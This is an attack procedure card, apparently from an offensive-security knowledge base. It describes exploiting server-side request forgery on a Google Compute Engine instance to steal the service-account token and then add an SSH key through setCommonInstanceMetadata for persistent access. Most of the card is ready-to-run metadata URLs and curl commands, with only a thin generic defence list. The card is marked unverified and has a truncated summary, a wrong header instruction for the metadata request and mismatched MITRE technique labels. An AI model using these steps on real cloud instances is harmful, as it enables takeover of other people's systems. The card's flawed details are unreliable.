---
id: dfb7acc2-f1a3-4ffc-a951-5c4670a2ec8e
name: SSRF URL for Google Cloud Instances - Add SSH Key
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:38.409018+00:00'
updated_at: '2023-04-10T20:24:15.115871+00:00'
tactics:
- '[[Collection|TA0009 - Collection]]'
- '[[Impact|TA0040 - Impact]]'
techniques:
- '[[Account Access Removal|T1531 - Account Access Removal]]'
- '[[Data from Cloud Storage|T1530 - Data from Cloud Storage]]'
tags:
- '[[Add an SSH key]]'
- '[[Server-Side Request Forgery]]'
- '[[SSRF URL for Cloud Instances]]'
- '[[SSRF URL for Google Cloud]]'
commands:
- '[[Get Token]]'
- '[[Get Token Information]]'
- '[[Set Common Instance Metadata]]'
---

# SSRF URL for Google Cloud Instances - Add SSH Key

## Summary

This procedure involves exploiting a server-side request forgery vulnerability in order to obtain an access token for a Google Compute Engine instance service account. Once the token is obtained, the attacker can use it to add an SSH key to the instance, providing persistent access to the compromis

## Description

# Description

This procedure involves exploiting a server-side request forgery vulnerability in order to obtain an access token for a Google Compute Engine instance service account. Once the token is obtained, the attacker can use it to add an SSH key to the instance, providing persistent access to the compromised system. Server-side request forgery vulnerabilities allow an attacker to send crafted requests from the vulnerable server, potentially bypassing firewalls and other security measures. By exploiting this vulnerability, an attacker can gain access to sensitive information and systems.

## Requirements

1. Access to a vulnerable server with a server-side request forgery vulnerability

1. Knowledge of the Google Compute Engine instance service account token and scope checker

1. Ability to add an SSH key to a Google Cloud Compute Engine instance

## Defense

1. Implement input validation to prevent server-side request forgery vulnerabilities

1. Restrict access to sensitive systems and information

1. Use multi-factor authentication and strong passwords to protect against unauthorized access

## Objectives

1. Obtain an access token for a Google Compute Engine instance service account

1. Add an SSH key to the compromised instance for persistent access

# Instructions

1. To retrieve the access token for the default service account of a Google Compute Engine instance, send a GET request to the above URL with an 'Authorization' header set to 'Bearer <metadata server access token>'.

**Code**: [[http://metadata.google.internal/computeMetadata/v1]]

> This command is useful for applications running on a Google Compute Engine instance that need to authenticate with Google APIs using the default service account. The access token can be used to make authorized API requests.

**Command** ([[Get Token]]):

```bash
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json
```

2. To check the scope of a token, run the following command in your terminal:

**Code**: [[$ curl https://www.googleapis.com/oauth2/v1/tokeni]]

> This command checks the scope of an access token that was generated using OAuth2.0. The 'scope' field in the response shows the list of permissions that the token has been granted. This is useful in verifying that the token has the necessary permissions to access the resources that your application requires.

**Command** ([[Get Token Information]]):

```bash
$ curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.XXXXXKuXXXXXXXkGT0rJSA
```

3. To add an SSH key to a Google Cloud Compute Engine Instance, use the following command:

**Code**: [[curl -X POST "https://www.googleapis.com/compute/v]]

> This command uses cURL to make a POST request to the Google Cloud Compute Engine API. The `Authorization` header is used to authenticate the request with a bearer token. The `Content-Type` header specifies that the data being sent is in JSON format. The `--data` option is used to specify the metadata key-value pair to be added to the instance. Replace `sshkeyname` and `sshkeyvalue` with the name and value of your SSH key respectively.

**Command** ([[Set Common Instance Metadata]]):

```bash
curl -X POST "https://www.googleapis.com/compute/v1/projects/1042377752888/setCommonInstanceMetadata" 
-H "Authorization: Bearer ya29.c.EmKeBq9XI09_1HK1XXXXXXXXT0rJSA" 
-H "Content-Type: application/json" 
--data '{"items": [{"key": "sshkeyname", "value": "sshkeyvalue"}]}'
```

## MITRE ATT&CK Mapping

### Tactics

- [[Collection|TA0009 - Collection]]
- [[Impact|TA0040 - Impact]]

### Techniques

- [[Account Access Removal|T1531 - Account Access Removal]]
- [[Data from Cloud Storage|T1530 - Data from Cloud Storage]]

## Commands Used

- [[Get Token]]
- [[Get Token Information]]
- [[Set Common Instance Metadata]]

## Tags

- [[Add an SSH key]]
- [[Server-Side Request Forgery]]
- [[SSRF URL for Cloud Instances]]
- [[SSRF URL for Google Cloud]]
